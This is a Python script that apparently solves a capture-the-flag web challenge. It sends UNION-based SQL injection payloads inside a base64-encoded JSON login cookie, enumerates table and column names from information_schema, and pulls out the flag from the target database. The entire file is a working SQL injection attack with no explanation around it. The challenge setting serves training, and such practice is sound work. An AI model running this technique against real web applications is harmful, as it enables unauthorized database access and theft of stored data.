#!/usr/bin/env python3
from base64 import b64encode
import requests, re

URL = "http://sn4ck-sh3nan1gans.challs.olicyber.it/"

cookie = '{{"ID": "{:s}"}}'
payload = "252352 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {:d}"

tables = []
for i in range(90):
    c = b64encode(
        cookie.format(
            payload.format(i)
        ).encode()
    ).decode()
    r = requests.get(URL + "home.php", cookies={"login": c})
    if not "Welcome" in r.text:
        break
    res = re.findall(r"Welcome (.*?)!", r.text)
    tables += res
    print(i, res[0])
i = input("Index: ")
table = tables[int(i)]

table = "here_is_the_flag"

payload = "252352 UNION SELECT column_name FROM information_schema.columns WHERE table_name = '{:s}' LIMIT 1 OFFSET {:d}"

columns = []
for i in range(10):
    c = b64encode(
        cookie.format(
            payload.format(table, i)
        ).encode()
    ).decode()
    r = requests.get(URL + "home.php", cookies={"login": c})
    if not "Welcome" in r.text:
        break
    res = re.findall(r"Welcome (.*?)!", r.text)
    print(i, res[0])
    columns += res

i = input("Index: ")
column = columns[int(i)]

payload = "252352 UNION SELECT {:s} FROM {:s}"
c = b64encode(
    cookie.format(
        payload.format(column, table)
    ).encode()
).decode()
r = requests.get(URL + "home.php", cookies={"login": c})
if "flag" in r.text:
    print("flag{" + re.findall(r"flag{(.*?)}", r.text)[0] + "}")
else:
    print("no flag")